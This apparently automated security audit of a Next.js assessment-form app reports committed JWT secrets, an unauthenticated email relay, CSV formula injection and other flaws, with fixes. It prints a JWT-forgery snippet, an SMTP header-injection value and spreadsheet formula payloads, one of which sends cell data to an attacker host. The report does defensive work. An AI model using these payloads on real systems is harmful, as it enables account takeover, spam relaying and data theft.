---
mode: retroactive
audited_date: 2026-08-03
phase: assessmentform-express-spa-multi-step-as
verdict: OPEN_THREATS
threats_open: 3
confirmed_high_critical: 3
confirmed_medium: 4
confirmed_low: 2
---

# Security Audit — AssessmentForm Express SPA (Multi-Step Assessment Form)

## Summary

**Application:** Multi-Step Assessment Form SPA  
**Stack:** Next.js 16 (App Router), TypeScript, PostgreSQL 16, Drizzle ORM 0.45, jose HS256 JWT  
**Audit mode:** Retroactive (no plan-time threat model; STRIDE register built from source)  
**Scope:** Full greenfield build on `develop` branch (~99 source files across 10 waves)  
**Date:** 2026-08-03  
**Auditor:** Automated security audit  

### Verdict: `OPEN_THREATS`

**3 CRITICAL/HIGH confirmed findings** — implementation must be remediated before production deployment.

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| HIGH | 2 |
| MEDIUM | 4 |
| LOW | 2 |
| INFO | 1 |

---

## Attack Surface Audited

| Area | Routes / Files | STRIDE | Verdict | Evidence |
|------|----------------|--------|---------|----------|
| Session creation (identity + JWT issuance) | `POST /api/sessions` | S, I, D | ✅ Auth OK; ⚠ No rate limit | `src/app/api/sessions/route.ts:32` |
| Session owner middleware (respondent) | `lib/middleware/requireSessionOwner.ts` | S, E | ✅ Ownership enforced | `src/lib/middleware/requireSessionOwner.ts:93` |
| Session read (lib/auth version) | `lib/auth/requireSessionOwner.ts` | E | ✅ Bypasses for SO but service layer re-validates email | `src/lib/session/sessionService.ts:196` |
| Auto-save responses | `PUT /api/responses/[sessionId]` | T, E | ✅ Session ownership verified; ⚠ question_id not validated against session sections | `src/lib/services/responseService.ts:30` |
| Submission finalize | `POST /api/submissions/[sessionId]` | T, E | ✅ Ownership + assessment guard correct | `src/app/api/submissions/[sessionId]/route.ts:35` |
| System Owner login | `POST /api/auth/login` | S | ✅ Email-only auth by design; SO list from DB | `src/app/api/auth/login/route.ts:37` |
| JWT signing / verification | `lib/auth/authService.ts` | S, T | ✅ HS256 + jose; ⚠ Placeholder secret in committed files | `drizzle/seed.ts`, `.env`, `docker-compose.yml` |
| JWT storage | Client-side (localStorage) | I | ⚠ XSS-accessible JWT storage | `src/app/page.tsx:25`, `src/app/dashboard/login/page.tsx:42` |
| Dashboard responses | `GET /api/dashboard/responses` | E, I | ✅ requireSystemOwner middleware applied | `src/app/api/dashboard/responses/route.ts:8` |
| Dashboard response detail | `GET /api/dashboard/responses/[sessionId]` | E, I | ✅ requireSystemOwner middleware applied | `src/app/api/dashboard/responses/[sessionId]/route.ts:11` |
| Dashboard analytics | `GET /api/dashboard/analytics` | E, I | ✅ requireSystemOwner; teamTypeFilter uses `inArray` (parameterized) | `src/lib/services/analyticsService.ts:13` |
| CSV export | `GET /api/dashboard/export/csv` | E, I, T | ✅ requireSystemOwner; ⚠ formula injection in CSV output | `src/lib/services/csvExportService.ts:119` |
| Config mutation | `PATCH /api/config` | T, E | ✅ requireSystemOwner; date validated | `src/app/api/config/route.ts:34` |
| Email notification | `POST /api/notifications/email` | S, I | 🚨 **No auth guard** — publicly accessible | `src/app/api/notifications/email/route.ts:25` |
| Assessment open guard | `lib/middleware/assessmentOpenGuard.ts` | T | ⚠ DB error fails open (continues) | `src/lib/middleware/assessmentOpenGuard.ts:48` |
| Health endpoint | `GET /api/health` | I | ℹ️ Public; leaks DB connectivity state | `src/app/api/health/route.ts:9` |
| Credential files in git | `.env`, `.env.local` | I | 🚨 **JWT secret + DB creds committed to repository** | `.env:1`, `.env.local:1` |
| SQL injection (Drizzle ORM) | All services | T | ✅ Parameterized queries throughout; `ilike` is parameterized | `src/lib/services/dashboardService.ts:50` |
| Sort column injection | `dashboardService.getResponseList` | T | ✅ Whitelist map with safe default | `src/lib/services/dashboardService.ts:59` |
| Sort direction injection | `dashboardService.getResponseList` | T | ✅ Ternary guard: `=== 'asc' ? asc : desc` | `src/lib/services/dashboardService.ts:23` |
| Zod input validation | `answerPayload.ts`, `sessions/route.ts` | T | ✅ Discriminated union covers all 6 types | `src/lib/schemas/answerPayload.ts:47` |
| Security headers | `next.config.ts` | I | ⚠ No Content-Security-Policy header | `next.config.ts:11` |
| CORS | None configured | S | ✅ Same-origin (Next.js App Router default) | N/A |
| CSRF | None (Bearer token auth) | T | ✅ Bearer JWTs are not sent automatically by browsers | N/A |

---

## Confirmed Findings

---

### FINDING-01 — Credentials Committed to Git Repository

| Field | Value |
|-------|-------|
| **ID** | FINDING-01 |
| **Severity** | CRITICAL |
| **Category** | Information Disclosure (STRIDE: I) |
| **Location** | `.env:1-3`, `.env.local:1-3`, `docker-compose.yml:31` |
| **Status** | CONFIRMED |

#### Description

Two credential files containing live secrets are committed to and tracked by the git repository:

1. **`.env`** (committed in commit `d16568d` and present in HEAD):
   ```
   JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
   DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
   ```

2. **`.env.local`** (committed; same content as `.env`):
   ```
   JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx
   DATABASE_URL=postgres://assessmentform:assessmentform_dev_password@localhost:5432/assessmentform
   ```

3. **`docker-compose.yml:31`** contains a well-known placeholder as the production JWT secret:
   ```
   JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value
   ```
   This text-literal string would be used as-is if the container is deployed without override.

Neither `.env` nor `.env.local` appear in `.gitignore`. Verification:
```
git ls-files -- .env .env.local
# Output: .env  .env.local  (both tracked)
```

#### Exploit Path

1. **JWT Forgery (any branch reader):** An attacker with read access to the repository (or CI/CD logs) learns `JWT_SECRET=uat-test-secret-32-chars-minimum-xxxxxxxx`. They forge a system_owner JWT with HS256: `{"role":"system_owner","email":"attacker@example.com","iat":…,"exp":…}` and gain full dashboard access, CSV export of all respondents, and `PATCH /api/config` to alter the assessment due date.

2. **Docker deployment with placeholder secret:** Any deployment of `docker-compose.yml` without explicitly overriding `JWT_SECRET` uses the placeholder string as the signing key. The placeholder is also public in the repository.

3. **Database credential exposure:** `assessmentform_dev_password` is exposed in both the `.env` files and `docker-compose.yml`. If the database port is reachable (port 5432 is exposed in docker-compose), an attacker can connect directly.

#### Fix

1. **Immediately:** Rotate `JWT_SECRET` and database password in all environments.
2. Add `.env` and `.env.local` to `.gitignore` and remove them from git history (`git filter-repo` or BFG Repo Cleaner).
3. Replace `docker-compose.yml` JWT_SECRET value with an environment variable reference: `JWT_SECRET: ${JWT_SECRET:?JWT_SECRET must be set}`.
4. Add a pre-commit hook or CI check (e.g., `git-secrets`, `truffleHog`, `gitleaks`) to prevent future secret commits.
5. `.env.example` already documents the correct pattern; use that as the only committed reference.

---

### FINDING-02 — Unauthenticated Public Email Relay Endpoint

| Field | Value |
|-------|-------|
| **ID** | FINDING-02 |
| **Severity** | HIGH |
| **Category** | Spoofing / Elevation of Privilege (STRIDE: S, E) |
| **Location** | `src/app/api/notifications/email/route.ts:25-41` |
| **Status** | CONFIRMED |

#### Description

`POST /api/notifications/email` is documented as "internal server-to-server only" but is a publicly accessible HTTP endpoint with **no authentication, no IP restriction, and no rate limiting**.

```typescript
// src/app/api/notifications/email/route.ts:25
export async function POST(request: NextRequest) {
  // No requireSystemOwner, no jwtMiddleware — completely unauthenticated
  const parsed = EmailNotificationSchema.safeParse(body);
  // ...
  sendSubmissionConfirmation(parsed.data);  // Forwards to EMAIL_RELAY_URL
  return NextResponse.json({ sent: true }, { status: 200 });
}
```

The endpoint schema only validates:
- `session_id`: UUID format (not verified to exist in DB)
- `email`: RFC 5322 format — **caller-controlled destination address**
- `name`: `min(1)` — no max length, no CRLF/injection stripping
- `due_date`: `min(1)` — any string

When `EMAIL_RELAY_URL` is configured in production, this endpoint:
1. Forwards a crafted email to any `to:` address the caller specifies.
2. The `name` field (rendered into email body via template literal) has no length cap or character sanitization — if the relay is SMTP-based, specially crafted `\r\n` sequences in `name` can perform **email header injection**.

#### Exploit Path

**Scenario A — Open email relay abuse (EMAIL_RELAY_URL set):**
```
POST /api/notifications/email
Content-Type: application/json

{"session_id":"00000000-0000-0000-0000-000000000001",
 "email":"victim@target.com",
 "name":"AttackerName",
 "due_date":"2026-12-01"}
```
→ The server sends an email from `noreply@assessmentform` to `victim@target.com` with the assessment branding. No authentication needed. Attackers can spam arbitrary addresses.

**Scenario B — SMTP header injection (via `name` field, if SMTP relay):**
```
"name": "X\r\nBcc: bulk-victim1@evil.com\r\nBcc: bulk-victim2@evil.com\r\nX-Injected: 1"
```
→ The email body template literal includes `name` verbatim without stripping control characters.

#### Fix

1. **Add authentication:** Apply `requireSessionOwner` (matching `session_id` to the calling JWT) or restrict the endpoint to internal calls only (e.g., using a shared `INTERNAL_SECRET` header verified server-side, or by removing the HTTP endpoint entirely and calling `emailService.ts` directly from `submissionService.ts`).
2. **Validate session_id exists in DB** before sending.
3. **Sanitize `name` field:** Strip `\r`, `\n`, and limit to 200 characters (matching respondents table constraint).
4. If the endpoint must remain public, add rate limiting (e.g., 3 requests per IP per minute).

---

### FINDING-03 — Default Placeholder JWT Secret in docker-compose.yml

| Field | Value |
|-------|-------|
| **ID** | FINDING-03 |
| **Severity** | HIGH |
| **Category** | Spoofing (STRIDE: S) |
| **Location** | `docker-compose.yml:31` |
| **Status** | CONFIRMED |

#### Description

The production `docker-compose.yml` hard-codes the JWT signing secret as the literal string `change-me-to-a-cryptographically-random-256-bit-value`:

```yaml
# docker-compose.yml:31
JWT_SECRET: change-me-to-a-cryptographically-random-256-bit-value
```

This value is committed to the repository and is therefore publicly known. Any deployment that uses `docker-compose up` **without separately providing `JWT_SECRET`** will sign all JWTs with this known string. The weakness is compounded by FINDING-01, which also reveals `uat-test-secret-32-chars-minimum-xxxxxxxx` as the git-committed secret.

Note: This is a separate finding from FINDING-01 because even if `.env`/`.env.local` are removed from git history, `docker-compose.yml` would still ship a known default.

#### Exploit Path

An attacker who reads the public git repository can construct a valid system_owner JWT signed with `change-me-to-a-cryptographically-random-256-bit-value`:

```javascript
import { SignJWT } from 'jose';
const secret = new TextEncoder().encode('change-me-to-a-cryptographically-random-256-bit-value');
const token = await new SignJWT({ session_id: null, email: 'attacker@x.com', role: 'system_owner' })
  .setProtectedHeader({ alg: 'HS256' })
  .setExpirationTime('8h')
  .sign(secret);
// → Valid system_owner JWT accepted by all requireSystemOwner-protected endpoints
```

#### Fix

Replace the hard-coded value with a mandatory environment variable reference:
```yaml
JWT_SECRET: ${JWT_SECRET:?Error: JWT_SECRET must be set before starting the application}
```
Document in `README` / `DEPLOYMENT.md` that operators must generate a cryptographically random 256-bit value (`openssl rand -hex 32`) before first run.

---

### FINDING-04 — CSV Formula Injection (CSV Export)

| Field | Value |
|-------|-------|
| **ID** | FINDING-04 |
| **Severity** | MEDIUM |
| **Category** | Tampering (STRIDE: T) |
| **Location** | `src/lib/services/csvExportService.ts:13-34`, `src/lib/services/csvExportService.ts:119-127` |
| **Status** | CONFIRMED |

#### Description

The CSV export at `GET /api/dashboard/export/csv` writes respondent-supplied data directly into CSV cells without sanitizing formula-injection characters. Fields at risk include:

- `respondent_name` — up to 200 chars, validated only as `min(2)`
- Free-text answers (`free_text_short` max 500, `free_text_long` max 2000)
- `other_text` in choice answers (max 500)

`csv-stringify` is used **without** the `cast` option that would escape leading `=`, `+`, `@`, or `-` characters. Verified:
```javascript
// node evaluation result:
// stringify([['=HYPERLINK("http://evil.com",1)', '+cmd|calc']])
// → "=HYPERLINK(""http://evil.com"",1)",+cmd|calc
// The leading = is preserved; Excel/LibreOffice will execute the formula
```

#### Exploit Path

A malicious respondent submits:
- `name`: `=HYPERLINK("http://attacker.com/steal?c="&A1,"Click me")`  
- Or a free-text answer: `=cmd|" /C calc"!A0`

A System Owner downloads the CSV and opens it in Microsoft Excel or LibreOffice Calc. The spreadsheet application executes the formula, potentially:
- Exfiltrating other cell values to an attacker-controlled server (HYPERLINK variant)
- Executing OS commands (DDE variant on older Excel)

**Severity is MEDIUM** because it requires the System Owner to open the CSV in a spreadsheet application and click through a security warning (modern Excel prompts before executing DDE/external links).

#### Fix

Apply formula injection sanitization in `flattenAnswerPayload` and for all respondent-name / email values before writing to CSV:

```typescript
function sanitizeCsvCell(value: string): string {
  // Escape leading formula characters per OWASP CSV Injection guidance
  if (value && ['+', '-', '=', '@', '\t', '\r'].includes(value[0])) {
    return `'${value}`;  // Prefix with single-quote to defang formula
  }
  return value;
}
```

Apply this to all user-supplied string fields before inclusion in CSV rows.

---

### FINDING-05 — JWT Tokens Stored in localStorage (XSS Exposure)

| Field | Value |
|-------|-------|
| **ID** | FINDING-05 |
| **Severity** | MEDIUM |
| **Category** | Information Disclosure (STRIDE: I) |
| **Location** | `src/app/page.tsx:25`, `src/app/page.tsx:48`, `src/app/dashboard/login/page.tsx:42` |
| **Status** | CONFIRMED |

#### Description

Both respondent and System Owner JWTs are stored in `localStorage`:
- `localStorage.getItem('af_token')` — respondent JWT (24h expiry)
- `localStorage.setItem('dashboard_token', data.token)` — system_owner JWT (8h expiry)

`localStorage` is accessible to any JavaScript executing on the same origin, including injected scripts from XSS vulnerabilities (e.g., in third-party dependencies, DOM-based XSS in rendered content). There is no `HttpOnly` cookie protection.

While no direct XSS vector was found in the current codebase, the absence of a Content Security Policy (FINDING-06) increases risk: a successful XSS attack would immediately yield both tokens.

A stolen system_owner JWT grants full dashboard access, CSV data export, and config mutation. A stolen respondent JWT allows reading and submitting another user's assessment.

#### Fix

1. **Preferred:** Migrate to `HttpOnly` + `SameSite=Strict` cookies for JWT storage. This eliminates XSS token theft.
2. **Mitigating:** Implement a strict Content-Security-Policy header (see FINDING-06) to reduce XSS attack surface.
3. Reduce JWT lifetime: system_owner tokens at 8h are appropriate, but consider shorter lifetimes for sensitive operations.

---

### FINDING-06 — No Content Security Policy (CSP) Header

| Field | Value |
|-------|-------|
| **ID** | FINDING-06 |
| **Severity** | MEDIUM |
| **Category** | Information Disclosure / Tampering (STRIDE: I, T) |
| **Location** | `next.config.ts:11-25` |
| **Status** | CONFIRMED |

#### Description

The security headers configured in `next.config.ts` include `X-Frame-Options: SAMEORIGIN`, `X-Content-Type-Options: nosniff`, `X-XSS-Protection: 1; mode=block`, and `Referrer-Policy`, but **no `Content-Security-Policy` header**:

```typescript
// next.config.ts:15-22
headers: [
  { key: 'X-Frame-Options', value: 'SAMEORIGIN' },
  { key: 'X-Content-Type-Options', value: 'nosniff' },
  { key: 'X-XSS-Protection', value: '1; mode=block' },
  { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
  // ← No Content-Security-Policy
],
```

`X-XSS-Protection` is deprecated in modern browsers (Chrome removed it in v78). Without CSP, the application has no defense-in-depth against XSS attacks, and a successful XSS would have unfettered access to localStorage (including JWTs — see FINDING-05).

#### Fix

Add a `Content-Security-Policy` header in `next.config.ts`. A baseline for this Next.js application:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{NONCE}'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'self'; form-action 'self';
```

For Next.js 13+ App Router, implement CSP nonces via middleware (see Next.js CSP documentation). Remove the deprecated `X-XSS-Protection` header.

---

### FINDING-07 — No Rate Limiting on Session Creation or Login Endpoints

| Field | Value |
|-------|-------|
| **ID** | FINDING-07 |
| **Severity** | MEDIUM |
| **Category** | Denial of Service / Information Disclosure (STRIDE: D, I) |
| **Location** | `src/app/api/sessions/route.ts:32`, `src/app/api/auth/login/route.ts:14` |
| **Status** | CONFIRMED |

#### Description

Neither `POST /api/sessions` nor `POST /api/auth/login` have any rate limiting, CAPTCHA, or abuse prevention. These endpoints:

1. **`POST /api/sessions`** — performs a DB lookup for every request (case-insensitive email query + potential insert). Without rate limiting, an attacker can:
   - Enumerate whether a given email is a system owner (the endpoint returns `SYSTEM_OWNER_CANNOT_RESPOND` for blocked emails, revealing SO membership indirectly).
   - Flood the respondents table with junk records.
   - Exhaust DB connection pool (max 20 connections configured).

2. **`POST /api/auth/login`** — queries `system_owner_emails` for each request. Returns distinct error codes: `NOT_A_SYSTEM_OWNER` vs `200 OK`. An attacker can brute-force the system owner email list.

#### Fix

1. Add IP-based rate limiting on these endpoints (e.g., 10 requests/minute per IP using `@upstash/ratelimit` or an nginx/edge rate-limit rule).
2. Consider implementing consistent response timing to prevent timing-based user enumeration.
3. For production deployment, place these endpoints behind an edge WAF or load balancer with rate-limit capability.

---

### FINDING-08 — assessmentOpenGuard Fails Open on Database Errors

| Field | Value |
|-------|-------|
| **ID** | FINDING-08 |
| **Severity** | LOW |
| **Category** | Tampering (STRIDE: T) |
| **Location** | `src/lib/middleware/assessmentOpenGuard.ts:48-51` |
| **Status** | CONFIRMED |

#### Description

When the assessment config cannot be read from the database, `assessmentOpenGuard` silently treats the assessment as open:

```typescript
// src/lib/middleware/assessmentOpenGuard.ts:48-51
} catch {
  // Guard failure is treated as open to not block respondents on DB errors
  // The actual save/submit will surface DB errors if they persist
  return { ok: true };
}
```

If a transient DB error occurs precisely at the due date boundary, a respondent could save answers or submit an assessment that should have been closed. This is a deliberate design trade-off (UX over strict enforcement) but constitutes a security boundary that can be bypassed by inducing DB errors.

#### Fix

Consider logging the guard failure as a WARNING-level event and returning `{ ok: true }` with a logged metric. For high-security deployments, change to fail-closed (`ASSESSMENT_CLOSED`) when the config cannot be read, with explicit operator notification. At minimum, ensure the exception is logged (currently caught silently).

---

### FINDING-09 — Unauthenticated /api/health Endpoint Leaks DB Status

| Field | Value |
|-------|-------|
| **ID** | FINDING-09 |
| **Severity** | INFO |
| **Category** | Information Disclosure (STRIDE: I) |
| **Location** | `src/app/api/health/route.ts:9-33` |
| **Status** | CONFIRMED (accepted risk — see below) |

#### Description

The health endpoint returns DB connectivity status without authentication:

```json
// 503 response:
{ "status": "error", "db": "disconnected", "timestamp": "2026-08-03T..." }
```

This reveals database availability to unauthenticated callers. In isolation this is low-risk, but combined with other vulnerabilities, a persistent `db: disconnected` response tells an attacker that DB-error-based bypasses (FINDING-08) are currently active.

**This is a common pattern for health endpoints** (required for container orchestration healthchecks) and is listed here for completeness. The risk is considered acceptable.

---

## Accepted Risks

| Risk | Rationale |
|------|-----------|
| `localStorage` JWT storage for respondents | Client-side auth is the intended architecture; mitigated by short JWT lifetime (24h) and domain-scoped keys. Fix: migrate to HttpOnly cookies (FINDING-05) in a future phase. |
| No HSTS header | The app is deployed via HTTP internally and in Docker. HSTS should be added when TLS termination is confirmed at the edge/load balancer layer. |
| `X-Frame-Options: SAMEORIGIN` instead of DENY | Required by the Pivota platform which embeds the app in an iframe. Comment documented in `next.config.ts:16`. |
| Health endpoint publicly accessible | Required for `docker-compose` healthcheck and external monitoring. DB status disclosure is low risk given no sensitive data is exposed. |
| question_id not cross-validated against session sections | A respondent can save an answer for any question UUID. The FK constraint prevents phantom questions (must exist in DB). Data would appear in the DB but not in the respondent's rendered sections. Impact: minor data pollution, no security bypass. Not exploitable to access another session. |
| LIKE wildcard pass-through in search param | The `search` parameter is passed via `ilike` which is parameterized (no SQL injection). Leading `%` matches all records but is gated by `requireSystemOwner` auth. Acceptable under authenticated endpoint. |

---

## Audit Trail

### STRIDE Register (Retroactive)

| ID | Component | STRIDE Class | Candidate Issue | Disposition |
|----|-----------|--------------|-----------------|-------------|
| S-01 | `/api/auth/login` | Spoofing | Email-only auth (no password) | ACCEPTED — by design; SO email list is access control |
| S-02 | JWT signing | Spoofing | Weak/known JWT secret | CONFIRMED → FINDING-01, FINDING-03 |
| S-03 | `/api/notifications/email` | Spoofing | Unauthenticated email relay | CONFIRMED → FINDING-02 |
| T-01 | `dashboardService.getResponseList` | Tampering | `sortBy` injection | SAFE — whitelist map with default |
| T-02 | `dashboardService.getResponseList` | Tampering | `sortDir` injection | SAFE — ternary: `=== 'asc' ? asc : desc` |
| T-03 | All services | Tampering | SQL injection via Drizzle | SAFE — parameterized queries; `ilike` confirmed parameterized |
| T-04 | `csvExportService` | Tampering | CSV formula injection | CONFIRMED → FINDING-04 |
| T-05 | `assessmentOpenGuard` | Tampering | Fails open on DB error | CONFIRMED → FINDING-08 |
| T-06 | `responseService.upsertResponses` | Tampering | Save responses to any question_id | ACCEPTED — FK constraint; no cross-session access; data pollution only |
| R-01 | `configService.patchConfig` | Repudiation | Config changes not audited | SAFE — config_audit_log table populated on every PATCH |
| I-01 | `.env`, `.env.local` in git | Information Disclosure | JWT secret + DB creds in version control | CONFIRMED → FINDING-01 |
| I-02 | JWT in localStorage | Information Disclosure | XSS-accessible token storage | CONFIRMED → FINDING-05 |
| I-03 | No CSP header | Information Disclosure | XSS attack surface | CONFIRMED → FINDING-06 |
| I-04 | `/api/health` | Information Disclosure | DB status leakage | CONFIRMED → FINDING-09 (INFO) |
| I-05 | `POST /api/auth/login` error codes | Information Disclosure | System owner email enumeration | CONFIRMED → FINDING-07 (rate limit absent) |
| D-01 | `POST /api/sessions` | Denial of Service | No rate limiting | CONFIRMED → FINDING-07 |
| D-02 | `POST /api/auth/login` | Denial of Service | No rate limiting | CONFIRMED → FINDING-07 |
| E-01 | `GET /api/dashboard/**` | Elevation of Privilege | RBAC bypass | SAFE — `requireSystemOwner` applied to all dashboard routes |
| E-02 | `PUT /api/responses/[sessionId]` | Elevation of Privilege | IDOR (other respondent's session) | SAFE — `requireSessionOwner` middleware verifies email ownership |
| E-03 | `POST /api/submissions/[sessionId]` | Elevation of Privilege | IDOR (other respondent's submission) | SAFE — `requireSessionOwner` middleware verifies email ownership |
| E-04 | `lib/auth/requireSessionOwner` | Elevation of Privilege | System owner bypass (reads any session) | SAFE — service layer (`getSessionById:196`) re-validates email; SO can't match respondent email |
| E-05 | `docker-compose.yml` JWT secret | Elevation of Privilege | Known default secret → forge system_owner JWT | CONFIRMED → FINDING-03 |

### Files Read

All 40 required files listed in the audit request were read in full. Additionally audited:
- `docker-compose.yml`
- `.env`, `.env.local`, `.env.example`
- `next.config.ts`
- `drizzle/seed.ts`, `drizzle/schema.ts`, `drizzle/migrate.ts`

### Methodology

1. Read all source files before analysis.
2. Built STRIDE register retroactively from the implementation surface.
3. For each HIGH/CRITICAL candidate: attempted adversarial refutation (traced user-controlled input to the sink, checked upstream guards).
4. Confirmed findings that survived refutation; marked safe items with evidence.
5. Verified `csv-stringify` formula injection with live node evaluation.
6. Verified git tracking of credential files with `git ls-files`.
